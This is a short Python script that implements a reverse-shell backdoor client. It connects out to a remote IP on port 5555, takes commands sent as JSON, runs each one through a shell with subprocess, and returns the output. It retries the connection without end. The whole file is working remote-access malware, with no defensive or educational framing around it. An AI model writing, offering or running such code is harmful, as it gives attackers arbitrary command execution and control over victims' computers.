import socket, json, subprocess, time, os

def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def reliable_recv():
    data = ""
    while True:
        try:
            data = data + s.recv(1024).decode().strip()
            return json.loads(data)
        except ValueError:
            continue

def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break

        elif command[:3] == "cd ":
            os.chdir(command[3:])

        elif command == "clear":
            pass

        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)

def connection(your_ip):
    time.sleep(1)
    try:
        s.connect((your_ip,5555))
        shell()
        s.close()

    except:
        connection(your_ip)



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
your_ip = input("server ip:\n")
connection(your_ip)
